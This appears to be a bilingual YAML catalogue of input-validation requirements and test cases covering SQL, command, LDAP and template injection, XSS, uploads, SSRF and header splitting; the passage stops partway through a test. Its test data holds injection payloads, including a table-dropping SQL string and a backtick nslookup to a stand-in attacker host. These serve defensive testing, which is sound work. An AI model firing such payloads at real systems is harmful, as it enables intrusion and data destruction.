area: input-validation
prefix: INP
group: security
name: {en: Input validation and injection, sv: Validering av indata och injektion}
description:
  en: Server-side validation, injection into SQL, commands, LDAP and XML, cross-site scripting and output encoding, file uploads, deserialisation and server-side request forgery.
  sv: Validering på servern, injektion i SQL, kommandon, LDAP och XML, skriptinjektion och utdatakodning, filuppladdning, deserialisering och förfalskade anrop från servern.

requirements:
  - id: INP-01
    type: security
    obligation: must
    priority: critical
    tags: [validation, server-side]
    refs: ["OWASP ASVS 5.0 V2.2.2 (validation at a trusted service layer)", "OWASP Input Validation Cheat Sheet", "NIST SP 800-53 SI-10", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "IEC 62443-4-2 CR 3.5", "CWE-20 (improper input validation)", "CWE-602 (client-side enforcement of server-side security)", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    tests: [INP-T01]
    en:
      title: Server-side validation of input
      description: The system MUST validate every input field on the server against a defined type, length and value range before processing it.
      rationale: Validation in the browser can be bypassed, so only the server can stop malformed input from reaching business logic.
      criteria:
        - method: test
          text: Requests that bypass the browser with too long, wrongly typed or out-of-range values are rejected with 400 and a field-level error.
        - method: review
          text: Every endpoint has a schema or validation rule for each of its input fields.
    sv:
      title: Validering av indata på servern
      description: Systemet SKA validera varje indatafält på servern mot en definierad typ, längd och tillåtet värdeintervall innan det behandlas.
      rationale: Validering i webbläsaren kan kringgås, så bara servern kan hindra felaktiga indata från att nå affärslogiken.
      criteria:
        - method: test
          text: Anrop som kringgår webbläsaren med för långa värden, fel typ eller värden utanför intervallet avvisas med 400 och ett fel per fält.
        - method: review
          text: Varje endpoint har ett schema eller en valideringsregel för vart och ett av sina indatafält.

  - id: INP-02
    type: security
    obligation: must
    priority: critical
    tags: [injection, sql-injection]
    refs: ["OWASP ASVS 5.0 V1.2.4 (parameterized queries)", "OWASP Top 10 2021 A03", "OWASP SQL Injection Prevention Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-89 (SQL injection)", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    tests: [INP-T02]
    en:
      title: Parameterised database queries
      description: The system MUST pass user input to the database only as bound parameters of prepared statements or through an object-relational mapper that binds them.
      rationale: Building SQL by string concatenation lets crafted input change the query and read or destroy the database.
      criteria:
        - method: review
          text: A static analysis finds no SQL text built by concatenating or formatting variables.
        - method: test
          text: A DAST scan with SQL injection payloads reports no finding.
    sv:
      title: Parametriserade databasfrågor
      description: Systemet SKA skicka användarens indata till databasen enbart som bundna parametrar i förberedda frågor eller via en objektrelationsmappare som binder dem.
      rationale: SQL som byggs genom att strängar sätts ihop låter manipulerade indata ändra frågan och läsa eller förstöra databasen.
      criteria:
        - method: review
          text: En statisk analys hittar ingen SQL-text som byggs genom att variabler sätts ihop eller formateras in.
        - method: test
          text: En DAST-skanning med nyttolaster för SQL-injektion rapporterar inget fynd.

  - id: INP-03
    type: security
    obligation: must_not
    priority: critical
    tags: [injection, command-injection]
    refs: ["OWASP ASVS 5.0 V1.2.5 (OS command injection)", "OWASP Top 10 2021 A03", "OWASP OS Command Injection Defense Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-78 (OS command injection)", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    tests: [INP-T03]
    en:
      title: No user input in shell commands
      description: The system MUST NOT pass user input to an operating system shell; external programs are started with a fixed path and a separate argument list.
      rationale: A shell interprets characters such as semicolons and backticks, so input can append commands of the attacker's choice.
      criteria:
        - method: review
          text: The code contains no call to a shell with a command string that includes request data.
        - method: test
          text: Inputs with shell metacharacters in fields passed to external programs cause no extra command to run.
    sv:
      title: Inga indata i skalkommandon
      description: Systemet SKA INTE skicka användarens indata till ett skal i operativsystemet; externa program startas med en fast sökväg och en separat argumentlista.
      rationale: Ett skal tolkar tecken som semikolon och bakåtfnuttar, så indata kan lägga till kommandon som angriparen väljer.
      criteria:
        - method: review
          text: Koden innehåller inget anrop till ett skal med en kommandosträng som innehåller data från anropet.
        - method: test
          text: Indata med skaltecken i fält som skickas till externa program gör inte att något extra kommando körs.

  - id: INP-04
    type: security
    obligation: must
    priority: high
    tags: [injection, ldap-injection]
    refs: ["OWASP ASVS 5.0 V1.2.6 (LDAP injection)", "OWASP LDAP Injection Prevention Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-90 (LDAP injection)", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    tests: [INP-T04]
    en:
      title: Escaped input in LDAP filters
      description: The system MUST escape the characters that have a special meaning in LDAP filters and distinguished names before it inserts user input into them.
      rationale: Unescaped input such as an asterisk or a closing parenthesis can widen a directory query or bypass a sign-in check.
      criteria:
        - method: test
          text: A user name of an asterisk or with an injected filter clause matches no directory entry and does not sign anyone in.
    sv:
      title: Skyddade indata i LDAP-filter
      description: Systemet SKA skydda tecken med särskild betydelse i LDAP-filter och unika namn i katalogen innan användarens indata sätts in i dem.
      rationale: Oskyddade indata som en asterisk eller en avslutande parentes kan vidga en katalogfråga eller kringgå en inloggningskontroll.
      criteria:
        - method: test
          text: Ett användarnamn som består av en asterisk eller innehåller en injicerad filtervillkorsdel matchar ingen post i katalogen och loggar inte in någon.

  - id: INP-05
    type: security
    obligation: must
    priority: critical
    tags: [xss, output-encoding]
    refs: ["OWASP ASVS 5.0 V1.2.1 (output encoding)", "OWASP Top 10 2021 A03", "OWASP Cross Site Scripting Prevention Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "CWE-79 (cross-site scripting)", "CWE-116 (improper encoding or escaping of output)"]
    tests: [INP-T05]
    en:
      title: Context-aware output encoding
      description: The system MUST encode user-supplied data for the HTML, attribute, JavaScript or URL context in which it is written to a page.
      rationale: Encoding stops stored or reflected input from running as script in other users' browsers.
      criteria:
        - method: test
          text: XSS payloads saved in each text field are shown as literal text and no script runs.
        - method: test
          text: A DAST scan for reflected and stored cross-site scripting reports no finding.
    sv:
      title: Utdatakodning efter sammanhang
      description: Systemet SKA koda data från användare för det sammanhang i HTML, attribut, JavaScript eller adress där de skrivs ut på en sida.
      rationale: Kodningen hindrar sparade eller speglade indata från att köras som skript i andra användares webbläsare.
      criteria:
        - method: test
          text: Nyttolaster för skriptinjektion som sparas i varje textfält visas som vanlig text och inget skript körs.
        - method: test
          text: En DAST-skanning efter speglad och lagrad skriptinjektion rapporterar inget fynd.

  - id: INP-06
    type: security
    obligation: should
    priority: medium
    tags: [xss, content-security-policy]
    refs: ["OWASP ASVS 5.0 V3.4.3 (Content-Security-Policy)", "W3C Content Security Policy Level 3", "ISO/IEC 27001:2022 A.8.26", "Regulation (EU) 2024/2847 (CRA) Annex I Part I §2(k)", "CWE-79 (cross-site scripting)", "MITRE ATT&CK T1059.007 (JavaScript)"]
    tests: [INP-T06]
    en:
      title: Content Security Policy without inline scripts
      description: The system SHOULD send a Content-Security-Policy header on every HTML response that allows scripts only from its own origin and does not contain unsafe-inline or unsafe-eval.
      rationale: The policy is a second line of defence that blocks injected scripts even when encoding has been missed.
      criteria:
        - method: test
          text: Every HTML response has a Content-Security-Policy header whose script-src allows only self, nonces or hashes.
    sv:
      title: Content Security Policy utan inbäddade skript
      description: Systemet BÖR skicka ett Content-Security-Policy-huvud på varje HTML-svar som tillåter skript enbart från den egna origin och som inte innehåller unsafe-inline eller unsafe-eval.
      rationale: Policyn är ett andra skydd som blockerar injicerade skript även när kodningen har missats.
      criteria:
        - method: test
          text: Varje HTML-svar har ett Content-Security-Policy-huvud vars script-src bara tillåter self, nonce eller hashar.

  - id: INP-07
    type: security
    obligation: must
    priority: high
    tags: [file-upload]
    refs: ["OWASP ASVS 5.0 V5.2.1 (file size)", "OWASP ASVS 5.0 V5.2.2 (file extension and content)", "OWASP File Upload Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-434 (unrestricted upload of file with dangerous type)", "CWE-770 (allocation of resources without limits or throttling)"]
    tests: [INP-T07]
    en:
      title: Uploaded files are checked by type and size
      description: The system MUST reject an uploaded file that is larger than 10 MB or whose content does not match a file type on the allowlist.
      rationale: Checking only the file name extension lets an attacker upload scripts or oversized files that exhaust storage.
      criteria:
        - method: test
          text: A file of 10 MB plus one byte is rejected, and an executable renamed to report.pdf is rejected.
    sv:
      title: Uppladdade filer kontrolleras efter typ och storlek
      description: Systemet SKA avvisa en uppladdad fil som är större än 10 MB eller vars innehåll inte motsvarar en filtyp på listan över tillåtna typer.
      rationale: Om bara filändelsen kontrolleras kan en angripare ladda upp skript eller för stora filer som fyller lagringen.
      criteria:
        - method: test
          text: En fil på 10 MB plus en byte avvisas, och en körbar fil som döpts om till rapport.pdf avvisas.

  - id: INP-08
    type: security
    obligation: must
    priority: high
    tags: [file-upload, storage]
    refs: ["OWASP ASVS 5.0 V5.3.1 (uploaded files not executed)", "OWASP ASVS 5.0 V5.3.2 (generated file paths)", "OWASP File Upload Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "CWE-552 (files or directories accessible to external parties)", "MITRE ATT&CK T1505.003 (web shell)"]
    tests: [INP-T08]
    en:
      title: Uploaded files are stored outside the web root
      description: The system MUST store uploaded files outside the web server's document root under a name generated by the system.
      rationale: A file that the web server can execute or that keeps a user-chosen path can lead to remote code execution or overwritten files.
      criteria:
        - method: inspection
          text: Uploaded files are found only in a storage location that the web server does not serve directly, under generated names.
        - method: test
          text: An uploaded file named ../../index.html is stored under a generated name and no existing file changes.
    sv:
      title: Uppladdade filer lagras utanför webbroten
      description: Systemet SKA lagra uppladdade filer utanför webbserverns dokumentrot under ett namn som systemet skapar.
      rationale: En fil som webbservern kan köra eller som behåller en sökväg som användaren valt kan leda till fjärrkörning av kod eller överskrivna filer.
      criteria:
        - method: inspection
          text: Uppladdade filer finns bara på en lagringsplats som webbservern inte serverar direkt, under genererade namn.
        - method: test
          text: En uppladdad fil med namnet ../../index.html lagras under ett genererat namn och ingen befintlig fil ändras.

  - id: INP-09
    type: security
    obligation: must_not
    priority: critical
    tags: [deserialisation]
    refs: ["OWASP ASVS 5.0 V1.5.2 (safe deserialization)", "OWASP Top 10 2021 A08", "OWASP Deserialization Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-502 (deserialization of untrusted data)", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    tests: [INP-T09]
    en:
      title: No deserialisation of untrusted objects
      description: The system MUST NOT deserialise data from untrusted sources into object types chosen by the data itself.
      rationale: Native object deserialisation of attacker data can run code during loading, before any validation takes place.
      criteria:
        - method: review
          text: Untrusted input is parsed only with data-only formats such as JSON into fixed types, and no native object serialisation is used on it.
        - method: test
          text: A known gadget-chain payload sent to each endpoint that accepts serialised data causes no code execution or outbound connection.
    sv:
      title: Ingen deserialisering av opålitliga objekt
      description: Systemet SKA INTE deserialisera data från opålitliga källor till objekttyper som data själva anger.
      rationale: Inbyggd deserialisering av objekt från en angripare kan köra kod redan vid inläsningen, innan någon validering sker.
      criteria:
        - method: review
          text: Opålitliga indata tolkas bara med rena dataformat som JSON till fasta typer, och ingen inbyggd objektserialisering används på dem.
        - method: test
          text: En känd nyttolast med gadgetkedja som skickas till varje endpoint som tar emot serialiserade data leder inte till kodkörning eller utgående förbindelse.

  - id: INP-10
    type: security
    obligation: must
    priority: critical
    tags: [ssrf, outbound-requests]
    refs: ["OWASP ASVS 5.0 V1.3.6 (server-side request forgery)", "OWASP Top 10 2021 A10", "OWASP Server-Side Request Forgery Prevention Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "CWE-918 (server-side request forgery)", "MITRE ATT&CK T1552.005 (cloud instance metadata API)"]
    tests: [INP-T10]
    en:
      title: Protection against server-side request forgery
      description: The system MUST refuse to fetch a user-supplied URL that resolves to a loopback, private, link-local or cloud metadata address.
      rationale: Otherwise an attacker can make the server reach internal services and cloud credentials that are not exposed to the internet.
      criteria:
        - method: test
          text: Webhook or import URLs that point to 127.0.0.1, 10.0.0.1, 169.254.169.254 and a public name that resolves to a private address are each refused.
    sv:
      title: Skydd mot förfalskade anrop från servern
      description: Systemet SKA vägra hämta en adress från en användare som pekar på en loopback-adress, en privat adress, en länklokal adress eller en adress för molnmetadata.
      rationale: Annars kan en angripare få servern att nå interna tjänster och molnuppgifter som inte är exponerade mot internet.
      criteria:
        - method: test
          text: Adresser för webhooks eller import som pekar på 127.0.0.1, 10.0.0.1, 169.254.169.254 och ett publikt namn som pekar på en privat adress avvisas var för sig.

  - id: INP-11
    type: security
    obligation: must
    priority: high
    tags: [xml, xxe]
    refs: ["OWASP ASVS 5.0 V1.5.1 (XML parser configuration)", "OWASP XML External Entity Prevention Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-611 (XML external entity reference)", "CWE-776 (XML entity expansion)"]
    tests: [INP-T11]
    en:
      title: XML parsers do not resolve external entities
      description: The system MUST configure every XML parser that reads untrusted input to reject document type definitions and external entities.
      rationale: External entities let an XML document read local files or make the server send requests to internal hosts.
      criteria:
        - method: test
          text: An uploaded XML document with an external entity that refers to a local file is rejected and the file content does not appear in any response.
    sv:
      title: XML-tolkar löser inte upp externa entiteter
      description: Systemet SKA konfigurera varje XML-tolk som läser opålitliga indata så att den avvisar dokumenttypsdefinitioner och externa entiteter.
      rationale: Externa entiteter låter ett XML-dokument läsa lokala filer eller få servern att skicka anrop till interna värdar.
      criteria:
        - method: test
          text: Ett uppladdat XML-dokument med en extern entitet som pekar på en lokal fil avvisas och filens innehåll syns inte i något svar.

  - id: INP-12
    type: security
    obligation: must
    priority: high
    tags: [open-redirect, url-validation]
    refs: ["CWE-601 (open redirect)", "OWASP Unvalidated Redirects and Forwards Cheat Sheet", "OWASP Web Security Testing Guide WSTG-CLNT-04", "ISO/IEC 27001:2022 A.8.28", "MITRE ATT&CK T1566.002 (spearphishing link)"]
    tests: [INP-T12]
    en:
      title: Redirect targets limited to own paths and listed hosts
      description: The system MUST redirect after sign-in, sign-out or any other action only to a relative path on its own host or to a host on a configured allow-list.
      rationale: An open redirect lends the system's trusted domain to phishing links and can leak authorisation codes to an attacker's site.
      criteria:
        - method: test
          text: Redirect parameters with an external host, a protocol-relative URL, a backslash trick or a javascript URL all end on the system's start page.
    sv:
      title: Omdirigeringsmål begränsas till egna sökvägar och listade värdar
      description: Systemet SKA efter inloggning, utloggning eller annan åtgärd omdirigera enbart till en relativ sökväg på den egna värden eller till en värd på en konfigurerad tillåtelselista.
      rationale: En öppen omdirigering lånar ut systemets betrodda domän till nätfiskelänkar och kan läcka auktoriseringskoder till en angripares webbplats.
      criteria:
        - method: test
          text: Omdirigeringsparametrar med en extern värd, en protokollrelativ adress, ett knep med omvänt snedstreck eller en javascript-adress hamnar alla på systemets startsida.

  - id: INP-13
    type: security
    obligation: must_not
    priority: critical
    tags: [template-injection, ssti]
    refs: ["CWE-1336 (server-side template injection)", "OWASP Web Security Testing Guide WSTG-INPV-18", "ISO/IEC 27001:2022 A.8.28", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    tests: [INP-T13]
    en:
      title: User input is never compiled as a template
      description: The system MUST NOT compile text entered by users, including email and document templates edited by administrators, with a template engine that can call code or read objects outside a sandbox.
      rationale: Server-side template injection usually gives the attacker remote code execution on the server.
      criteria:
        - method: test
          text: Template expressions such as {{7*7}} and ${7*7} in user fields and editable templates are shown literally or rendered by a logic-less engine, and never evaluate to 49 through a code-capable engine.
        - method: review
          text: The code passes user text to the template engine only as data, never as template source, outside the sandboxed engine.
    sv:
      title: Användarinmatning kompileras aldrig som mall
      description: Systemet SKA INTE kompilera text som användare har skrivit in, inklusive e-post- och dokumentmallar som administratörer redigerar, med en mallmotor som kan anropa kod eller läsa objekt utanför en sandlåda.
      rationale: Mallinjektion på servern ger oftast angriparen möjlighet att köra kod på servern.
      criteria:
        - method: test
          text: Malluttryck som {{7*7}} och ${7*7} i användarfält och redigerbara mallar visas bokstavligt eller tolkas av en logikfri motor, och beräknas aldrig till 49 av en motor som kan köra kod.
        - method: review
          text: Koden skickar användartext till mallmotorn enbart som data och aldrig som mallkälla, utanför den sandlådade motorn.

  - id: INP-14
    type: security
    obligation: must
    priority: medium
    tags: [redos, regular-expressions, denial-of-service]
    refs: ["CWE-1333 (inefficient regular expression complexity)", "OWASP Input Validation Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "MITRE ATT&CK T1499.004 (application or system exploitation)"]
    tests: [INP-T14]
    en:
      title: Regular expressions on input cannot stall a request
      description: The system MUST evaluate regular expressions on user input with a linear-time engine or a time limit of 100 milliseconds per evaluation.
      rationale: A crafted string can make a backtracking regular expression run for minutes and block a worker thread, which a few requests turn into an outage.
      criteria:
        - method: test
          text: A 50 000-character string designed to cause catastrophic backtracking in each validation pattern is rejected or matched within 100 ms.
          threshold: "≤ 100 ms per evaluation"
    sv:
      title: Reguljära uttryck på indata kan inte låsa ett anrop
      description: Systemet SKA utvärdera reguljära uttryck på användarindata med en motor med linjär tid eller med en tidsgräns på 100 millisekunder per utvärdering.
      rationale: En konstruerad sträng kan få ett reguljärt uttryck med bakåtspårning att köra i minuter och blockera en arbetstråd, vilket ett fåtal anrop gör till ett avbrott.
      criteria:
        - method: test
          text: En sträng på 50 000 tecken som är utformad för att orsaka katastrofal bakåtspårning i varje valideringsmönster avvisas eller matchas inom 100 ms.
          threshold: "≤ 100 ms per utvärdering"

  - id: INP-15
    type: security
    obligation: must
    priority: high
    tags: [header-injection, response-splitting]
    refs: ["CWE-113 (HTTP response splitting)", "OWASP Web Security Testing Guide WSTG-INPV-15", "ISO/IEC 27001:2022 A.8.28"]
    tests: [INP-T15]
    en:
      title: No line breaks from input in response headers
      description: The system MUST reject or remove carriage return and line feed characters in any user-supplied value before it writes the value into an HTTP response header.
      rationale: Line breaks in a header value let an attacker add headers, set cookies or split the response, which leads to cache poisoning and cross-site scripting.
      criteria:
        - method: test
          text: A file name or redirect value containing %0d%0aSet-Cookie gives a response with no added header and no extra cookie.
    sv:
      title: Inga radbrytningar från indata i svarshuvuden
      description: Systemet SKA avvisa eller ta bort tecknen vagnretur och radmatning i varje värde från användaren innan värdet skrivs in i ett huvud i ett HTTP-svar.
      rationale: Radbrytningar i ett huvudvärde låter en angripare lägga till huvuden, sätta kakor eller dela svaret, vilket leder till förgiftad cache och skript mellan webbplatser.
      criteria:
        - method: test
          text: Ett filnamn eller omdirigeringsvärde som innehåller %0d%0aSet-Cookie ger ett svar utan tillagt huvud och utan extra kaka.

  - id: INP-16
    type: security
    obligation: should
    priority: medium
    tags: [unicode, normalisation, identifiers, spoofing]
    refs: ["Unicode Standard Annex #15", "Unicode Technical Standard #39", "OWASP Input Validation Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "CWE-1007 (insufficient visual distinction of homoglyphs)", "CWE-180 (validate before canonicalize)", "MITRE ATT&CK T1036.010 (masquerade account name)"]
    tests: [INP-T16]
    en:
      title: Identifiers normalised and checked for look-alikes
      description: The system SHOULD normalise user names and organisation names to Unicode NFKC before it validates and stores them, and refuse a new name whose skeleton matches an existing one.
      rationale: Names that look identical but use other code points let an attacker pose as an administrator or another organisation.
      criteria:
        - method: test
          text: Registering "аdmin" with a Cyrillic а, or "ａｄｍｉｎ" in full-width letters, is refused while "admin" exists.
    sv:
      title: Identifierare normaliseras och kontrolleras mot förväxlingsbara tecken
      description: Systemet BÖR normalisera användarnamn och organisationsnamn till Unicode NFKC innan de valideras och lagras, och avvisa ett nytt namn vars teckenskelett matchar ett befintligt.
      rationale: Namn som ser likadana ut men använder andra kodpunkter låter en angripare utge sig för att vara en administratör eller en annan organisation.
      criteria:
        - method: test
          text: Registrering av "аdmin" med kyrilliskt а, eller "ａｄｍｉｎ" med breda tecken, avvisas när "admin" finns.

tests:
  - id: INP-T01
    priority: critical
    execution: automated
    tags: [validation, server-side]
    refs: ["OWASP Input Validation Cheat Sheet", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "IEC 62443-4-2 CR 3.5", "CWE-20 (improper input validation)", "CWE-602 (client-side enforcement of server-side security)", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    en:
      title: Invalid input sent directly to the API is rejected
      description: A script derives invalid values from each endpoint's schema and sends them without the browser.
      preconditions: The API description defines types, lengths and ranges for every input field, and a test account exists.
      expected: Each invalid value is rejected with 400 and nothing is stored.
      steps:
        - action: For each string field, send a value one character longer than its maximum length.
          expected: Each request is rejected with 400 and an error that names the field.
        - action: For each numeric field, send a value below the minimum, above the maximum and a non-numeric string.
          expected: Each request is rejected with 400 and an error that names the field.
          data: "-1, 2147483648, abc"
        - action: Read back the affected records.
          expected: None of the invalid values has been stored.
    sv:
      title: Ogiltiga indata som skickas direkt till API:et avvisas
      description: Ett skript tar fram ogiltiga värden från varje endpoints schema och skickar dem utan webbläsaren.
      preconditions: API-beskrivningen anger typ, längd och intervall för varje indatafält, och ett testkonto finns.
      expected: Varje ogiltigt värde avvisas med 400 och inget sparas.
      steps:
        - action: Skicka för varje strängfält ett värde som är ett tecken längre än den största tillåtna längden.
          expected: Varje anrop avvisas med 400 och ett fel som anger fältet.
        - action: Skicka för varje numeriskt fält ett värde under minimum, ett värde över maximum och en sträng som inte är ett tal.
          expected: Varje anrop avvisas med 400 och ett fel som anger fältet.
          data: "-1, 2147483648, abc"
        - action: Läs tillbaka de berörda posterna.
          expected: Inget av de ogiltiga värdena har sparats.

  - id: INP-T02
    priority: critical
    execution: automated
    tags: [sql-injection, dast]
    refs: ["OWASP Web Security Testing Guide WSTG-INPV-05", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-89 (SQL injection)", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    en:
      title: SQL injection scan and code check
      description: A DAST scanner sends SQL injection payloads to every parameter, and a static analysis rule checks how queries are built.
      preconditions: An authenticated DAST scan profile for the test environment and a static analysis rule for concatenated SQL.
      expected: Neither the scan nor the analysis reports a finding.
      steps:
        - action: Run the DAST scan with the SQL injection rule set against all endpoints.
          expected: The scan finishes and reports no SQL injection.
          data: "' OR '1'='1, 1; DROP TABLE users--, ' UNION SELECT NULL--"
        - action: Run the static analysis rule for SQL built from strings on the source code.
          expected: No finding is reported.
    sv:
      title: Skanning efter SQL-injektion och kodkontroll
      description: En DAST-skanner skickar nyttolaster för SQL-injektion till varje parameter och en regel för statisk analys kontrollerar hur frågor byggs.
      preconditions: En autentiserad DAST-profil för testmiljön och en regel för statisk analys som hittar ihopsatt SQL.
      expected: Varken skanningen eller analysen rapporterar något fynd.
      steps:
        - action: Kör DAST-skanningen med regeluppsättningen för SQL-injektion mot alla endpoints.
          expected: Skanningen slutförs och rapporterar ingen SQL-injektion.
          data: "' OR '1'='1, 1; DROP TABLE users--, ' UNION SELECT NULL--"
        - action: Kör regeln för statisk analys av SQL som byggs av strängar på källkoden.
          expected: Inget fynd rapporteras.

  - id: INP-T03
    priority: critical
    execution: manual
    tags: [command-injection]
    refs: ["OWASP Web Security Testing Guide WSTG-INPV-12", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-78 (OS command injection)", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    en:
      title: Shell metacharacters do not run extra commands
      description: Sends shell metacharacters in fields that are passed to external programs, such as a file name for conversion.
      preconditions: A function that calls an external program, and a way to observe processes or outbound DNS on the server.
      expected: Only the intended program runs and no injected command takes effect.
      steps:
        - action: Enter a value that appends a sleep command and submit it.
          expected: The response time does not grow by 10 seconds.
          data: "report.pdf; sleep 10"
        - action: Enter a value that tries to trigger a DNS lookup of a host you control.
          expected: No lookup of that host is seen.
          data: "report.pdf`nslookup x.attacker.example`"
        - action: Review the code that starts the external program.
          expected: It uses a fixed program path and an argument list without a shell.
    sv:
      title: Skaltecken kör inga extra kommandon
      description: Skickar skaltecken i fält som förs vidare till externa program, till exempel ett filnamn för konvertering.
      preconditions: En funktion som anropar ett externt program och ett sätt att se processer eller utgående DNS-uppslag på servern.
      expected: Bara det avsedda programmet körs och inget injicerat kommando får effekt.
      steps:
        - action: Ange ett värde som lägger till ett sleep-kommando och skicka det.
          expected: Svarstiden ökar inte med 10 sekunder.
          data: "report.pdf; sleep 10"
        - action: Ange ett värde som försöker utlösa ett DNS-uppslag av en värd som du styr.
          expected: Inget uppslag av den värden syns.
          data: "report.pdf`nslookup x.attacker.example`"
        - action: Granska koden som startar det externa programmet.
          expected: Den använder en fast programsökväg och en argumentlista utan skal.

  - id: INP-T04
    priority: high
    execution: manual
    tags: [ldap-injection]
    refs: ["OWASP Web Security Testing Guide WSTG-INPV-06", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-90 (LDAP injection)", "MITRE ATT&CK T1190 (exploit public-facing application)"]
    en:
      title: LDAP filter injection does not widen a search or sign in
      description: Sends LDAP filter syntax in the user name and in directory search fields.
      preconditions: The system signs users in or searches users against an LDAP directory in the test environment.
      expected: The special characters are treated as literal text.
      steps:
        - action: Sign in with an asterisk as user name and any password.
          expected: The sign-in fails with the normal error.
          data: "*"
        - action: Sign in with a user name that closes the filter and adds an always-true clause.
          expected: The sign-in fails with the normal error.
          data: "admin)(|(uid=*"
        - action: Search the user directory for an asterisk.
          expected: No entries or only entries whose name contains an asterisk are returned.
    sv:
      title: Injektion i LDAP-filter vidgar inte en sökning och loggar inte in
      description: Skickar syntax för LDAP-filter i användarnamnet och i sökfält mot katalogen.
      preconditions: Systemet loggar in eller söker användare mot en LDAP-katalog i testmiljön.
      expected: Specialtecknen behandlas som vanlig text.
      steps:
        - action: Logga in med en asterisk som användarnamn och ett godtyckligt lösenord.
          expected: Inloggningen misslyckas med det vanliga felet.
          data: "*"
        - action: Logga in med ett användarnamn som stänger filtret och lägger till ett villkor som alltid är sant.
          expected: Inloggningen misslyckas med det vanliga felet.
          data: "admin)(|(uid=*"
        - action: Sök efter en asterisk i användarkatalogen.
          expected: Inga poster returneras, eller bara poster vars namn innehåller en asterisk.

  - id: INP-T05
    priority: critical
    execution: automated
    tags: [xss, dast]
    refs: ["OWASP Web Security Testing Guide WSTG-INPV-01", "OWASP Web Security Testing Guide WSTG-INPV-02", "ISO/IEC 27001:2022 A.8.28", "CWE-79 (cross-site scripting)", "CWE-116 (improper encoding or escaping of output)"]
    en:
      title: Cross-site scripting payloads are shown as text
      description: A browser-driven script saves XSS payloads in every text field and opens the pages that show them; a DAST scan covers reflected input.
      preconditions: A headless browser test with a test account and a list of all forms with text fields.
      expected: No payload runs as script.
      steps:
        - action: Save each payload in each text field of each form.
          expected: The values are saved.
          data: "<script>alert(1)</script>, \"><img src=x onerror=alert(1)>, javascript:alert(1)"
        - action: Open each page that shows the saved values and listen for dialogs and console calls.
          expected: No dialog opens and the payloads are shown as literal text.
        - action: Run the DAST scan for reflected cross-site scripting.
          expected: No finding is reported.
    sv:
      title: Nyttolaster för skriptinjektion visas som text
      description: Ett webbläsarstyrt skript sparar nyttolaster för skriptinjektion i varje textfält och öppnar sidorna som visar dem; en DAST-skanning täcker speglade indata.
      preconditions: Ett test i en huvudlös webbläsare med ett testkonto och en lista över alla formulär med textfält.
      expected: Ingen nyttolast körs som skript.
      steps:
        - action: Spara varje nyttolast i varje textfält i varje formulär.
          expected: Värdena sparas.
          data: "<script>alert(1)</script>, \"><img src=x onerror=alert(1)>, javascript:alert(1)"
        - action: Öppna varje sida som visar de sparade värdena och lyssna efter dialogrutor och konsolanrop.
          expected: Ingen dialogruta öppnas och nyttolasterna visas som vanlig text.
        - action: Kör DAST-skanningen efter speglad skriptinjektion.
          expected: Inget fynd rapporteras.

  - id: INP-T06
    priority: medium
    execution: automated
    tags: [content-security-policy]
    refs: ["W3C Content Security Policy Level 3", "ISO/IEC 27001:2022 A.8.26", "Regulation (EU) 2024/2847 (CRA) Annex I Part I §2(k)", "CWE-79 (cross-site scripting)", "MITRE ATT&CK T1059.007 (JavaScript)"]
    en:
      title: HTML responses carry a strict Content Security Policy
      description: A script crawls the application and checks the Content-Security-Policy header of every HTML response.
      preconditions: An authenticated crawler for the test environment.
      expected: Every HTML response has a policy without unsafe-inline or unsafe-eval for scripts.
      steps:
        - action: Crawl all reachable pages and collect the response headers.
          expected: Every HTML response has a Content-Security-Policy header.
        - action: Parse the script-src directive of each policy, or default-src when script-src is missing.
          expected: It allows only self, nonces or hashes, and contains neither unsafe-inline nor unsafe-eval.
    sv:
      title: HTML-svar har en strikt Content Security Policy
      description: Ett skript går igenom applikationen och kontrollerar huvudet Content-Security-Policy på varje HTML-svar.
      preconditions: En autentiserad sökrobot för testmiljön.
      expected: Varje HTML-svar har en policy utan unsafe-inline eller unsafe-eval för skript.
      steps:
        - action: Gå igenom alla nåbara sidor och samla in svarshuvudena.
          expected: Varje HTML-svar har ett Content-Security-Policy-huvud.
        - action: Tolka direktivet script-src i varje policy, eller default-src när script-src saknas.
          expected: Det tillåter bara self, nonce eller hashar och innehåller varken unsafe-inline eller unsafe-eval.

  - id: INP-T07
    priority: high
    execution: manual
    tags: [file-upload]
    refs: ["OWASP Web Security Testing Guide WSTG-BUSL-08", "OWASP Web Security Testing Guide WSTG-BUSL-09", "ISO/IEC 27001:2022 A.8.28", "IEC 62443-3-3 SR 3.5", "CWE-434 (unrestricted upload of file with dangerous type)", "CWE-770 (allocation of resources without limits or throttling)"]
    en:
      title: Uploads are checked for size and real file type
      description: Uploads files at the size limit, above it, and with a misleading extension.
      preconditions: A signed-in user on a page with a file upload, and test files prepared in advance.
      expected: Only allowed file types up to 10 MB are accepted.
      steps:
        - action: Upload a PDF file of exactly 10 MB.
          expected: The file is accepted.
